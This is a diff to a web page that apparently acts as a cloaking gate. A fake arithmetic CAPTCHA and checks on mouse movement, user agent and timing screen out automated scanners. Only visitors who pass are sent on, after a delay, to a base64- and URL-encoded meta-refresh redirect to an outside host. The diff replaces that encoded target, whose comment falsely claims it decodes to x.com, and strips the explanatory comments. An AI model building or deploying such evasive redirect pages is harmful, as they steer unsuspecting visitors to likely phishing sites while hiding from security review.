@@ -32,19 +32,17 @@
 
   <script>
     // 👇 PLACE YOUR BASE64 URL HERE
-    let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vd29ya2luZ3dva2Vycy5mZW5tZW5vcy5kZS9iYzBRUCUyMiUyMC8lM0U="; // Base64 for https://x.com
+    let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF"; 
 
     // CAPTCHA and bot detection
     let num1, num2;
     let mouseMoved = false;
     const startTime = Date.now();
 
-    // Detect mouse movement
     window.addEventListener("mousemove", () => {
       mouseMoved = true;
     });
 
-    // Basic behavioral & environment check
     function isHumanLike() {
       return (
         navigator.userAgent.length > 20 &&
@@ -57,14 +55,12 @@
       );
     }
 
-    // CAPTCHA generator
     function generateCaptcha() {
       num1 = Math.floor(Math.random() * 10) + 1;
       num2 = Math.floor(Math.random() * 10) + 1;
       document.getElementById("captcha-question").innerText = `What is ${num1} + ${num2}?`;
     }
 
-    // Submit handler
     function submitCaptcha() {
       const answer = parseInt(document.getElementById("captcha-answer").value, 10);
       const elapsed = Date.now() - startTime;
@@ -76,8 +72,7 @@
         elapsed > 1500
       ) {
         document.getElementById("redirect-message").style.display = "block";
-
-        // Short delay before redirect to make it harder to intercept in real-time
+        
         setTimeout(() => {
           try {
             const url = atob(ref);
